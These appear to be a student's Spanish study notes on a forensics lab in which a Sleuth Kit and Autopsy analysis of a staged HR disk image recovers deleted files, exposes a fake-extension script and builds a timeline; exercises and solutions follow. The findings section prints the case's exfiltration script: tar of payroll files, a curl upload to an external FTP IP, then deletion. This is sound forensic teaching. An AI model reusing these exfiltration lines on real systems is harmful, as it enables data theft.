---
asignatura: Ciberseguridad
fecha: 2026-11-05
tema: "Tema 4 · Laboratorio 4 (parte 2): análisis forense de una imagen de disco con Sleuth Kit y Autopsy (caso del equipo de RRHH): borrados, inodos, extensiones falsas, foremost y línea temporal"
fuente: transcripción de la clase (1 h 07 min) y tres PDF del laboratorio (LÉEME de la estructura, 1 pág.; Práctica 1 Autopsy y Sleuth Kit, 2 págs.; Autopsy paso a paso, 3 págs.). Según el audio, el material está en el foro, "material complementario". No recibidos: el enunciado del caso, el contexto para el informe y la «solución del profesor» (`CIBER_Lab04_Caso_RRHH_solucion_profesor`) que cita el PDF. Donde difieren, manda el PDF. Lo añadido por mí va marcado (mío).
---
# Ciber · Laboratorio 4 (parte 2) · Analizar una imagen con Sleuth Kit y Autopsy (5/11)

> Anterior: [Clase 8 / Lab 4 parte 1 (3/11): adquisición con `dd` y Guymager](2026-11-03_lab4-adquisicion-dd-guymager-e-informe-pericial.md) · Profesor: Damián Sualdea Soy

El 3/11 se **adquirió** un disco (copia bit a bit + hash). Hoy se hace lo siguiente: **analizar** la copia de un caso. La evidencia es la imagen del **equipo de RRHH de una empresa de nóminas**, ya adquirida y sellada con su hash; el trabajo es investigarla **sin tocarla**, con herramientas de Kali, y sacar de ahí el material del informe de la **Actividad 1**.

Convención: **(PDF)** = guías del laboratorio, **(clase)** = audio, **(mío)** = añadido por mí, **(notas de Dani)** = tu lista.

> [!warning] Corrección a la nota del 3/11
> Allí se anotó que el jueves 5/11 se analizaría una **máquina Windows 7** en VirtualBox. **No fue así:** esta clase se hizo en **Kali, con el caso RRHH y Autopsy**. Las máquinas **Windows 7 (Forense 1, 2 y 3)** quedaron como **retos opcionales** (ver más abajo).

## Lo imprescindible

> [!important] Las cuatro preguntas que hay que contestar (clase)
> 1. ¿Hubo un **acceso no autorizado**? ¿**Dónde y cuándo**?
> 2. ¿Se **dejó algo** en el equipo (un script, una herramienta)?
> 3. ¿Se **intentó ocultar** algo (ficheros borrados, extensiones falsas)?
> 4. ¿Se **llevaron información** y **en qué orden** pasó todo?
>
> La estructura del informe: **resumen ejecutivo, cuerpo técnico y anexos**. "Con eso es suficiente."

> [!important] Los cinco comandos de Sleuth Kit y foremost (PDF)
> ```bash
> fls -r imagen.dd                      # listar todos los ficheros y carpetas
> fls -r -d imagen.dd                   # SOLO los borrados
> icat imagen.dd <inodo> > recuperado   # recuperar un borrado por su número
> fls -r -m / imagen.dd > cuerpo.body ; mactime -b cuerpo.body | less   # línea temporal
> foremost -i imagen.dd -o carved       # tallar ficheros por su firma
> ```
> Más `strings imagen.dd | grep -i SECRETO` para buscar texto suelto.

> [!important] Regla de oro (clase, la misma del 3/11)
> **La evidencia no se toca.** Se trabaja sobre la copia, y el hash de la imagen es "la evidencia principal": al final, "ojo, la evidencia no la hemos tocado".

> [!note] Autopsy y Sleuth Kit son lo mismo
> El profesor lo repite: **Autopsy es una interfaz gráfica; por debajo usa Sleuth Kit** (`fls`, `icat`, `mactime`...). Se hace de dos maneras, por comandos y con interfaz gráfica, y el resultado es idéntico. **Si Autopsy te da problemas, tira de los comandos** (PDF).

## Tus apuntes, contrastados (notas de Dani)

| Tu nota | Veredicto |
|---|---|
| "Se trabaja por imágenes, no se monta y se usan comandos específicos" | **Correcto en lo esencial.** Las herramientas de Sleuth Kit leen la imagen directamente: "no podemos hacer un `ls` ni nada de eso a no ser que lo montemos", por eso "instrucciones tan raras que no son raras" (clase). Matiz: el PDF dice "montamos en solo lectura", pero lo que hace es **`losetup -r`**, que enlaza la imagen como dispositivo (`/dev/loop0`) y **no monta el sistema de ficheros**. No hay `mount` |
| "`*` significa que fueron robados" | **Incorrecto.** El asterisco marca ficheros **borrados**, no robados. El profesor: "estos asteriscos quieren decir que están borrados" |
| "inodo" | Correcto, pero hace falta saber para qué: es el **número** con el que recuperas un borrado (ver abajo) |
| "foremost" | Correcto. Recupera **por la firma del contenido**, no por el nombre ni por estar marcado como borrado (ver abajo) |
| Te falta | `icat`, `fls -d`, la **línea temporal** (`mactime`), el **hash** como prueba principal, los **ficheros con extensión falsa**, el **`auth.log`** y el uso de **Autopsy** |

## Conceptos desde cero

| Término | Qué es |
|---|---|
| **Imagen** (`.img`, `.dd`) | Una copia bit a bit de un disco, guardada en un fichero. En Linux "no hay extensiones, se trabaja con el contenido": `.dd` o `.img` solo sirven para **recordarte que es una copia** (clase) |
| **FAT32** | El sistema de ficheros de esta imagen. Es **uno suelto, sin tabla de particiones** (PDF): esto importa en Autopsy (ver Tarea 2) |
| **Fichero borrado** | Al borrar, el sistema **marca** el fichero como borrado, pero **sus datos siguen en el disco** hasta que otra cosa los pise (clase: "no se borra, se indica que está borrada") |
| **`*` en `fls`** | La marca de "borrado" delante del nombre (clase) |
| **Inodo** | El **número** que identifica a cada fichero dentro del sistema de ficheros; lo ves en la salida de `fls` y lo usas con `icat` (clase: "el inodo es el número que aparece") |
| **Tallado (*carving*)** | Buscar en **todo el disco** datos que "parezcan" un tipo de fichero (por su cabecera), **estén o no listados** (clase: "arcaiving" en el audio roto) |
| **Extensión falsa** | Un fichero que se llama `.jpg` pero **no es una imagen**. Autopsy lo marca como *Extension Mismatch* (PDF) |
| **Línea temporal** | Todos los ficheros ordenados por **cuándo se crearon, modificaron o accedieron**. Permite atar los hechos en orden |
| **Hash** | Huella de la imagen; demuestra que no se ha alterado (clase del 3/11) |
| **Flag** (bandera) | En los retos tipo **CTF** (*Capture The Flag*), un **código** que demuestra que has encontrado la prueba; lo pegas en la solución y el sistema te dice que está bien (clase). Aquí es el texto `SECRETO{...}` |

> [!note] Dos matices técnicos (mío)
> - **FAT no tiene inodos de verdad** (eso es de los sistemas de ficheros de Linux como ext4). Sleuth Kit les asigna **un número propio** a cada entrada, y lo llama "inodo". Para el laboratorio da igual; sirve de nota si algún día te lo preguntan.
> - Lo que el profesor llama "borrar un disco de verdad" (rellenarlo varias veces de ceros y unos) es otra cosa: el **borrado seguro**. En la clase un compañero lo mezcló con el tallado y el profesor lo aclaró: tallar **no** es lo mismo que recuperar un borrado; "si hace un *carving* al final lo va a encontrar" mientras no se haya **sobrescrito**.

## Tarea 0 · Preparar la imagen

```bash
gunzip evidencia_EQUIPO-RRHH.img.gz                          # (PDF) deja evidencia_EQUIPO-RRHH.img
sudo losetup -r -f --show evidencia_EQUIPO-RRHH.img          # (PDF) -r = solo lectura  → /dev/loop0
sudo dd if=/dev/loop0 of=imagen.dd bs=4M status=progress     # (PDF) tu copia de trabajo
```

- "**A partir de aquí trabajas sobre `imagen.dd` (o directamente sobre la `.img`), nunca sobre el original**" (PDF).
- En clase el profesor llamó a la copia **`evidencia2.dd`** y la bloqueó con `losetup` (audio confuso en las opciones; manda el PDF). Con `ls` debe aparecer la copia. Tú pones el nombre que quieras: **solo hay que cambiar el nombre del fichero en cada comando** ("cuando ponga imagen.dd, ponemos evidencia2.dd, es lo único que tenéis que cambiar").
- **(mío) Para soltar el dispositivo al terminar:** `sudo losetup -d /dev/loop0` (visto en la [nota del 3/11](2026-11-03_lab4-adquisicion-dd-guymager-e-informe-pericial.md)).
- **(mío) El hash:** el PDF no lo pide aquí porque la imagen llega "ya adquirida y sellada". Si quieres demostrar que no la has tocado, calcula `sha256sum` de la imagen **antes y después** de analizarla y compáralos.

## Tarea 1 · Sleuth Kit por comandos (Opción A del PDF: "va al 100%")

| Para qué | Comando | Origen |
|---|---|---|
| Listar todo (ficheros y carpetas) | `fls -r imagen.dd` | (PDF y clase) |
| Listar solo los borrados | `fls -r -d imagen.dd` | (PDF y clase) |
| Listar indicando el formato | `fls -f fat -r imagen.dd` | (clase; "no lo tenéis" en el PDF) |
| Recuperar un borrado | `icat imagen.dd <inodo> > recuperado.txt` | (PDF y clase) |
| Ver lo recuperado | `cat recuperado.txt` | (clase) |
| Ver de qué tipo es un fichero | `file <fichero>` | (PDF: "míralo con `file` / por su firma") |
| Buscar texto suelto | `strings imagen.dd \| grep -i SECRETO` | (PDF) |

**Qué significan las opciones** (clase): `-r` recorre las carpetas en profundidad; `-d` muestra solo los borrados; el `*` marca los borrados; el número que sale en cada línea es el **inodo**.

**Recuperar un borrado, paso a paso (clase):**
1. `fls -r -d imagen.dd` → salen **dos** borrados. Apunta su inodo.
2. En clase salían el inodo **77** (un `.txt` en `Documentos`) y el **136** (un `.jpg` en `Fotos`).
3. `icat imagen.dd 77 > recuperado.txt` → **hace falta redirigir la salida** (`>`): "como este no puedo modificarlo, lo sacamos a otro lado".
4. `cat recuperado.txt` → aparece el contenido, con **el primer *flag***.
5. Con la imagen: `icat imagen.dd 136 > hola.jpg` y se abre desde el gestor de ficheros (en clase se llamó `hola.jpg`).

> [!warning] Un tropiezo del profesor que te puede pasar
> Al principio no le salía nada y pensó que faltaba indicar el formato (`-f fat`). El fallo real era que **se le había olvidado la redirección `> recuperado.txt`**. Si `icat` te "no hace nada", mira primero eso.

**Detectar una extensión falsa (clase, el comando exacto no está en el PDF):** el profesor pasó el inodo del fichero sospechoso por una instrucción que **lee la cabecera** del contenido y dice qué es. El resultado: un `.jpg` que en realidad es **un script de shell**. **(mío) reconstrucción, sin confirmar el comando literal:**

```bash
icat imagen.dd <inodo> > sospechoso ; file sospechoso     # debería decir "Bourne-Again shell script"
```

> [!important] La idea, en sus palabras
> "Yo nunca me fiaría de ninguna extensión, porque no sé lo que hay dentro. Me pueden engañar." Las extensiones son una forma de **esconder cosas**. En Autopsy esto sale automático (*Extension Mismatch*).

## Tarea 2 · Autopsy (la interfaz gráfica)

> [!warning] La versión (PDF y clase)
> En Kali, `autopsy` es la **2.x clásica (~2008, en Perl, abandonada)**: **se maneja desde el navegador**, no en una ventana normal. El **Autopsy 4** moderno (Java, con línea temporal que funciona, detección automática de extensiones falsas...) es sobre todo de **Windows**. El profesor lo llama "súper cutre; cuanto más cutre, más divertido".

**Arrancar:**
1. **Menú de Kali → Forense → autopsy** (clase; te pide la contraseña de sudo de tu máquina) **o** en una terminal `sudo autopsy` y **déjala abierta** (PDF).
2. Copia la dirección `http://localhost:9999/autopsy` (puerto **9999**) y ábrela en **Firefox**.

**Crear el caso y añadir la imagen (PDF, pasos 3-10):**
1. **NEW CASE** → *Case Name* `RRHH-001` (solo letras y números), *Investigator* con tu nombre → **CREATE CASE**.
2. **ADD HOST** → **ADD HOST** (valores por defecto; `host1`) → **ADD IMAGE**.
3. **ADD IMAGE FILE** → *Location*: la **ruta completa** de tu imagen (p. ej. `/home/kali/imagen.dd`).
4. ***Type*: `Partition`** (**NO** `Disk`).
5. ***Import Method*: `Symlink`** (enlaza, no copia) → **NEXT**.
6. En *Image File Details* deja "Ignore the hash" (para clase vale; si quieres **cadena de custodia**, marca *Calculate* + *Verify*). Detecta `Partition 1 (fat32)`, `C:`. **ADD → OK**.

> [!important] Primer truco: Partition, no Disk (PDF)
> La imagen es un **FAT32 suelto sin tabla de particiones**. Si la metes como *Disk*, Autopsy busca la tabla, no la encuentra y **no ves nada**. Como *Partition* la lee directa. El profesor confirmó en clase que ya reconoce `fat32`.

**Analizar (PDF, pasos 11-13):** marca la imagen en la pantalla del host (`vol1`, `C:/`, fat32) → **ANALYZE**. Barra de herramientas: **FILE ANALYSIS · KEYWORD SEARCH · FILE TYPE · IMAGE DETAILS · META DATA · DATA UNIT**. En **FILE ANALYSIS** ves `C:/` con las carpetas **Descargas, Documentos, Fotos, logs** y un `leeme.txt`.

> [!important] Segundo truco: el contenido sale ABAJO (PDF)
> Al pinchar el **nombre** de un fichero, el contenido **no se abre en una ventana**: aparece **abajo en la misma página**. Baja con el scroll y pulsa **ASCII** (o *ASCII Strings*; también *Hex* y *Export*). Truco: botón derecho sobre el nombre → abrir en pestaña nueva.

**Lo que da cada botón (clase y PDF):**
- **Los borrados salen en rojo** ("¿qué creéis que es eso en rojo? Que ha sido eliminado") y los puedes pinchar para ver el contenido. Abajo a la izquierda, el botón **ALL DELETED FILES** los lista.
- **KEYWORD SEARCH:** busca `SECRETO` o una IP; te lleva directo al fichero.
- **FILE TYPE:** clasifica por tipo.
- **Para guardar** un fichero recuperado: **Export**.

## Tarea 3 · Tallado con foremost (arqueología del disco)

```bash
sudo apt install foremost           # (clase) no viene instalado
foremost -i imagen.dd -o carved     # (PDF) -i = imagen de entrada, -o = carpeta de salida
```

- Qué hace (clase): busca en **todo el disco** cosas que "parezcan" una imagen (u otro tipo, por su firma) y las **restaura**, "aunque no estuvieran borradas". Lo mejor, para "buscar en sitios que no están".
- En la salida (clase) hay un **`audit.txt`** con el informe y **una carpeta por tipo** (p. ej. `jpg`). Se ve bien con `tree`. Si lo lanzaste con `sudo`, los ficheros son de **root** y `tree` te dará "permission denied": usa `sudo tree`.
- En clase encontró **dos imágenes más**; **qué dos son, sin confirmar** (no está en el PDF).
- **(mío)** `foremost` se niega a escribir en una carpeta de salida que **ya tenga contenido**; usa una nueva o vacía.
- El profesor nombró también **PhotoRec** (herramienta parecida, con interfaz de texto; el audio sale roto como "fotorec"). Sin confirmar; no la usó.

> [!note] Borrado frente a tallado (clase)
> `fls -d` encuentra lo que el sistema **marcó** como borrado. `foremost` encuentra lo que **aún parece** un fichero aunque nadie lo marque. Si se **sobrescribe** el disco (ceros y unos varias veces), no queda nada que encontrar.

## Tarea 4 · La línea temporal

```bash
fls -r -m / imagen.dd > cuerpo.body       # (PDF) volcar los metadatos de todos los ficheros a un "body"
mactime -b cuerpo.body | less             # (PDF) ordenarlos por fecha; | less para leerlo paginado
```

- `-m /` pone `/` como prefijo de las rutas del *body*; `mactime -b` lo lee y lo ordena por tiempo. El profesor: "**mactime** es lo primero que se hace".
- En clase el *body* y la línea temporal se crearon con `fls`/`mactime` y se miraron con `cat` o `less`. Salen **logs, documentos, fotos**: qué se crea, qué se ejecuta y qué se borra, **en orden**.
- **(mío)** `mactime` muestra tiempos **M, A, C, B** (modificación, acceso, cambio de metadatos, creación) según lo que registre el sistema de ficheros.

**Desde Autopsy (PDF, pasos 14-16):** cierra el volumen (**CLOSE**) → en la pantalla del host, **FILE ACTIVITY TIME LINES**:
1. **CREATE DATA FILE:** marca la imagen, deja *Allocated* + *Unallocated*, salida `body`, *Generate MD5* marcado → **OK**.
2. **CREATE TIMELINE:** *Input file* `body`, fechas en `None/None`, salida `timeline.txt`, formato *Tabulated* → **OK**.

> [!warning] "VIEW TIMELINE" da "Invalid Month" (PDF y clase): es un bug, no tuyo
> El visor gráfico de Autopsy 2.x se atraganta con las fechas `0000-00-00` del propio FAT. El fichero está **bien generado** (es lo mismo que `fls -r -m | mactime`). **Se lee con un editor o con `cat`**:
> ```bash
> mousepad /var/lib/autopsy/RRHH-001/host1/output/timeline.txt     # (PDF)
> ```
> Ese fichero es el que **pegas en el informe**.

## Lo que encuentra el caso (para contrastar con TU resultado)

> [!note] Hazlo primero tú
> Esto es lo que cuentan el PDF y la clase. Hazlo antes con tus propios comandos y compáralo, o te pierdes la parte de aprender. Las claves del PDF se sustituyen por marcadores.

**a) El acceso: `logs/auth.log`** (PDF). Tres intentos fallidos y luego `Accepted password for admin from 185.220.101.47` el **20/10 a las 03:14:07**. La sesión dura hasta las 03:21.

**b) La herramienta: `Descargas/actualizar_sistema.jpg`** (PDF). Es un `.jpg` que **no es una foto**: es un **script de shell** de exfiltración.

```bash
tar czf /tmp/.rrhh.tgz /home/rrhh/nominas                          # empaqueta las nóminas
curl -T /tmp/.rrhh.tgz ftp://185.220.101.47/robo/ --user intruso:<CLAVE>   # las sube por FTP a la MISMA IP del SSH
rm -f /tmp/.rrhh.tgz                                               # borra el rastro
```

**c) Lo borrado** (PDF y clase). Dos ficheros recuperables: **`credenciales_robadas.txt`** (en `Documentos`), con un volcado de contraseñas y la flag `SECRETO{exfiltracion_rrhh_2026}`, y **`foto_oficina.jpg`** (en `Fotos`), un JPEG **real** (contraste con el otro `.jpg`).

**d) La historia atada por la línea temporal** (PDF):

| Hora (20/10/2026) | Hecho |
|---|---|
| 03:11–03:12 | 3 intentos SSH fallidos desde la IP externa |
| 03:14:07 | Acceso SSH correcto como `admin` |
| 03:16:30 | Se crea `credenciales_robadas.txt` |
| 03:18:10 | Se crea `actualizar_sistema.jpg` (el script) |
| 03:22:40 | Se modifica `auth.log` (borrado de rastro); luego se borran los ficheros |

El profesor lo llama **"el punto cero"**: a las 3 de la mañana empieza lo sospechoso, y "**todo lo que venga a partir de aquí ya es otra persona; ya no nos podemos fiar**". Conclusión del PDF: acceso no autorizado con robo de datos de RRHH y borrado de rastro.

> [!warning] Tres cosas que un informe pericial no debería afirmar tal cual (mío)
> 1. **"Entró como `admin` (uid=0 = root)"** (PDF). En el log de `sshd`, `session opened for user admin by (uid=0)` significa que el **proceso que abre la sesión** (`sshd`, que corre como root) lo hace **para el usuario `admin`**. **No prueba que `admin` sea root.** Comprueba qué dice **tu** captura antes de escribirlo.
> 2. **"Fuerza bruta"**: el PDF y el profesor lo dicen, pero la evidencia solo muestra **3 fallos y un acierto**. Es compatible con fuerza bruta y también con claves mal escritas o reutilizadas. Mejor: "intentos fallidos seguidos de un acceso correcto", y la hipótesis aparte.
> 3. **"Alguien hizo doble clic y se ejecutó"** (el profesor, como hipótesis en clase): en la imagen **no se ve cómo se ejecutó el script**. Es una hipótesis, no un hallazgo.

## Si algo no funciona

| Síntoma | Causa probable | Qué hacer |
|---|---|---|
| Autopsy no muestra nada tras añadir la imagen | La metiste como *Disk* | Añádela como **Partition** (el FAT32 no tiene tabla de particiones) |
| Pinchas un fichero y no ves el contenido | Se abre **abajo**, en la misma página | Baja con el scroll y pulsa **ASCII** |
| *Invalid Month* en el visor de línea temporal | Bug de Autopsy 2.x | Lee `timeline.txt` con `mousepad` o `cat` |
| `icat` no imprime nada | Falta la redirección `> fichero` | `icat imagen.dd 77 > recuperado.txt` y luego `cat` |
| `ls` no funciona sobre la imagen | No está montada (y no se monta) | Usa `fls` sobre la imagen |
| `tree` da "permission denied" en la carpeta de `foremost` | Se creó con `sudo` (es de root) | `sudo tree <carpeta>` |
| `foremost` da error al empezar | La carpeta de salida ya tiene contenido (mío) | Usa una carpeta nueva |
| `autopsy` no abre ninguna ventana | Se maneja desde el navegador | Copia `http://localhost:9999/autopsy` en Firefox |

## Qué entregar y qué es opcional (Actividad 1)

**Según el LÉEME (PDF):** para el apartado de forense de la Actividad 1 **entregas el caso que quieras**: el de clase (**«Forense Laboratorio»**, el RRHH de hoy) **o cualquiera de los tres retos Windows (Forense 1, 2 o 3)**, y **hasta donde llegues**: "con eso puedes ir a por la nota máxima de este apartado". Hacer más de uno, "mejor todavía".

**Qué se entrega del caso de clase (PDF):** **cada hallazgo con su captura y el comando (o la pantalla de Autopsy) que lo obtuvo**, y una **conclusión de qué pasó, cuándo y cómo**. El informe lleva **resumen ejecutivo + cuerpo técnico (+ anexos)**.

**Opcional: los tres retos Windows 7 (LÉEME):** son tres máquinas que **arrancas** y **investigas en vivo** con herramientas **Nirsoft/Sysinternals** y comandos de Windows. Van de menos a más:
- **Forense 1 (básico):** alguien ha entrado en el equipo; para coger soltura.
- **Forense 2 (intermedio):** intrusión completa en un servidor (entrada desde fuera, accesos, web cambiada, puertas traseras, firewall caído...).
- **Forense 3 (avanzado):** "el reto gordo, con poca ayuda".

> [!note] Detalles de la clase
> - "Lo que hagamos aquí va a ser suficiente para la entrega; después los he dejado 3 más para que juguéis" (clase).
> - **El informe es solo del forense.** Si un compañero metió la auditoría de contraseñas en el mismo documento, el profesor dijo que valía, pero "eso no es forense".
> - El profesor propone **pasar el material a una IA para el informe ejecutivo**. **(mío)** Si lo haces, comprueba cada dato contra **tus** capturas: el apartado anterior muestra que hay afirmaciones del propio PDF que no se sostienen tal cual.
> - **Aviso legal (PDF):** todo esto **solo** sobre las imágenes y máquinas que da el profesor o sobre **tus propios equipos** (arts. 197 y 264 del Código Penal).
> - El caso se presenta con un empleado, **"Jim"**. El PDF aclara que es **solo la ambientación del enunciado**; en pantalla todo aparece como RRHH. En el audio el profesor lo mezcla con el reto Windows 3; **manda el PDF** (sin confirmar el resto).

---

# Práctica

> Primero los ejercicios; **las soluciones, al final**. Intenta cada uno sin mirar.

## Nivel 1 · Conceptos

1. ¿Por qué no se hace `ls` ni `cat` sobre la imagen original, y por qué se trabaja siempre con una copia?
2. ¿Qué significa el `*` delante de un fichero en la salida de `fls`? ¿Qué **no** significa?
3. ¿Qué es el inodo en este laboratorio y para qué lo necesitas?
4. Explica con tus palabras la diferencia entre un fichero **borrado**, uno **tallado** y un disco **sobrescrito**.
5. ¿Por qué en Autopsy 2.x esta imagen hay que añadirla como *Partition* y no como *Disk*?
6. ¿Qué es una *flag* y qué papel tiene en un laboratorio forense?
7. ¿Por qué no debes fiarte de la extensión de un fichero? ¿Cómo compruebas qué es de verdad?

## Nivel 2 · Comandos

8. Escribe el comando que lista **solo los borrados** de `imagen.dd`, con rutas completas.
9. En la salida ves un borrado con inodo **77**. Escribe el comando que **recupera** su contenido a `salida.txt` y el que lo **muestra**.
10. Crea la **línea temporal** de `imagen.dd` en dos comandos y di cómo la lees paginada.
11. Escribe el comando de `foremost` para tallar `imagen.dd` en la carpeta `carved`. ¿Qué esperas encontrar dentro? ¿Qué pasa si `carved` ya existe con ficheros?
12. No sabes en qué fichero está la palabra `SECRETO`. Busca de dos formas: una por **comandos** y otra con **Autopsy**.

## Nivel 3 · Casos

13. **Lee este log** (la IP es de documentación):
    ```
    Nov  3 02:41:10 srv sshd[811]: Failed password for root from 198.51.100.23 port 40122 ssh2
    Nov  3 02:41:13 srv sshd[811]: Failed password for root from 198.51.100.23 port 40122 ssh2
    Nov  3 02:41:19 srv sshd[813]: Accepted password for deploy from 198.51.100.23 port 40130 ssh2
    Nov  3 02:41:19 srv sshd[813]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
    ```
    a) ¿Qué pasó, en una frase? b) ¿Es `deploy` root? c) ¿Puedes escribir "fuerza bruta" en el informe? ¿Cómo lo redactarías?
14. En una imagen, `fls -r` muestra `Descargas/vacaciones.jpg`. Lo recuperas con `icat` y `file` responde `Bourne-Again shell script`. ¿Qué concluyes con seguridad y qué **no** puedes afirmar todavía?
15. Redacta en **5-6 líneas** el **resumen ejecutivo** de un caso en el que se ha demostrado un acceso externo de madrugada, la subida de un fichero comprimido a una IP y el borrado posterior de ficheros, para un director **no técnico**.
16. Tu timeline muestra que un fichero se **crea a las 03:16**, otro **a las 03:18**, y que **a las 03:22** se modifica `auth.log`. ¿Qué te dicen esas horas sobre el orden de los hechos y por qué es importante modificar el log al **final**?

---

## Soluciones

> No mires aquí antes de haber intentado los ejercicios.

**Nivel 1**

1. Porque **la evidencia no se toca**: cualquier acceso puede modificar datos o metadatos y la prueba pierde valor. Además, las herramientas leen la **imagen directamente**; el original queda bloqueado y se demuestra con el **hash**.
2. Que el fichero está **borrado** (el sistema lo marcó, pero los datos pueden seguir). **No** significa "robado" ni "sospechoso".
3. Es el **número** que identifica al fichero en el sistema de ficheros; sale en `fls` y se usa con `icat` para **recuperar** un borrado concreto. (En FAT es un número que asigna Sleuth Kit.)
4. **Borrado**: el sistema lo marcó como borrado, los datos siguen (`fls -d` + `icat`). **Tallado**: se busca por la **firma del contenido** en todo el disco, aunque no esté listado (`foremost`). **Sobrescrito**: se ha escrito encima (varias pasadas de ceros y unos) y ya no se puede recuperar.
5. Porque la imagen es un **FAT32 suelto, sin tabla de particiones**. Como *Disk*, Autopsy busca la tabla, no la encuentra y no muestra nada.
6. Un **código** que demuestra que has encontrado la prueba (como en los **CTF**); en el laboratorio es el texto `SECRETO{...}` dentro del fichero recuperado.
7. Porque la extensión **se puede cambiar** y solo es el nombre. Se comprueba el **contenido** (la cabecera/firma) con `file`, o con *Extension Mismatch* en Autopsy.

**Nivel 2**

8. `fls -r -d imagen.dd`
9. `icat imagen.dd 77 > salida.txt` y `cat salida.txt`
10. `fls -r -m / imagen.dd > cuerpo.body` y `mactime -b cuerpo.body | less`
11. `foremost -i imagen.dd -o carved`. Dentro: `audit.txt` y una carpeta por tipo (p. ej. `jpg`) con lo tallado. Si `carved` ya tiene contenido, `foremost` se niega a escribir (mío).
12. **Comandos:** `strings imagen.dd | grep -i SECRETO`. **Autopsy:** pestaña **KEYWORD SEARCH**, buscar `SECRETO`; te lleva directo al fichero.

**Nivel 3**

13. a) Dos intentos fallidos para `root` desde una IP y, seis segundos después, un acceso correcto para `deploy` desde la misma IP. b) **No lo muestra.** `by (uid=0)` es el proceso `sshd` (que corre como root) abriendo la sesión **para** `deploy`. c) No como hecho: la evidencia son **dos fallos seguidos de un acierto**. Redacción: "se registran dos intentos fallidos para `root` y un acceso correcto de `deploy` desde la misma IP; se plantea como hipótesis un intento de adivinar credenciales".
14. **Seguro:** el fichero se llama `.jpg` pero **su contenido es un script**; la extensión no coincide. **No afirmable aún:** qué hace el script (hay que **leerlo**), si **se ejecutó** (hay que buscar otras evidencias, como la línea temporal o los logs) ni quién lo puso.
15. Ejemplo: "El [fecha], de madrugada, un usuario externo accedió al equipo de RRHH con una cuenta legítima tras varios intentos fallidos. Poco después se crearon dos ficheros: un listado de credenciales y un script disfrazado de imagen. El script empaqueta las nóminas y las envía por FTP a la misma dirección externa del acceso. A continuación se modificó el registro de accesos y se borraron ficheros para ocultar la actividad. Hay datos de nóminas potencialmente expuestos y se recomienda cambiar credenciales y notificar según la normativa aplicable." (Ajusta a **tus** hallazgos.)
16. Que **el orden de los hechos** es: primero se crean los ficheros (03:16 y 03:18) y **después** se toca el log (03:22). Eso sugiere que alguien **actúa y luego intenta ocultarlo**. Es importante que sea al final porque borrar o editar el log **antes** de actuar no ocultaría lo que se hace después.

---

## Dudas y cosas sin confirmar

- **Opciones exactas de `losetup`** en el audio: salen rotas ("lot setup menos f..."). Manda el PDF: `-r -f --show`.
- **`-f fat`:** el profesor lo usó en una de las listas y al principio creyó que hacía falta; el PDF no lo lleva. Para esta imagen no es imprescindible (inferencia mía).
- **Inodos concretos:** el audio da **77** (el `.txt`) y **136** (la imagen) para los borrados; para el script sale un número que el audio no deja claro. Sácalos tú con `fls -r`.
- **El comando de "mírame las cabeceras":** el profesor dijo que **no está en el documento** ("son pruebas que estoy haciendo"); lo que aparece arriba es mi reconstrucción.
- **Las dos imágenes de `foremost`:** sin confirmar cuáles eran.
- **Material que no he recibido:** enunciado del caso, contexto para el informe y la solución del profesor (el PDF cita `CIBER_Lab04_Caso_RRHH_solucion_profesor`). Cuando los tengas, revisa esta nota.
- **Fecha de entrega:** el LÉEME no la fija. La conocida es el **lunes 9/11** (nota del 3/11, ya vencida a fecha de esta nota).
- **Windows 7:** el LÉEME dice que se **arrancan** e investigan **en vivo**, lo que **modifica** la evidencia. Es un compromiso asumido en estos retos (el profesor lo dijo el 3/11); en un caso real se **bloquearía** y se trabajaría sobre una copia.
- Omitido: la contraseña de sudo de Kali que se dijo en voz alta, y las conversaciones laterales de la clase.

## Logística y para llevar a casa

- **Actividad 1 (forense):** a tus capturas y comandos añade **qué pasó, cuándo y cómo**. Si todavía no has entregado, el LÉEME dice que se entrega **hasta donde llegues** y que con el caso de clase hay base para la nota máxima del apartado.
- **Checklist del informe del caso de clase:**
  - [ ] Imagen preparada, copia de trabajo y hash (antes y después).
  - [ ] Los **borrados** (`fls -r -d`) y su recuperación con `icat`, con captura.
  - [ ] El **fichero con extensión falsa** y la prueba de su tipo real.
  - [ ] El **`auth.log`** con el acceso (hora, usuario, IP).
  - [ ] La **línea temporal** (`mactime` o `timeline.txt`).
  - [ ] **Resumen ejecutivo**, **cuerpo técnico** y **anexos**.
- **Opcional:** descargar e importar los retos Windows 7 (Forense 1, 2 y 3) y probar con el 1.
- El profesor dijo que **iría añadiendo más laboratorios** de forense más adelante.
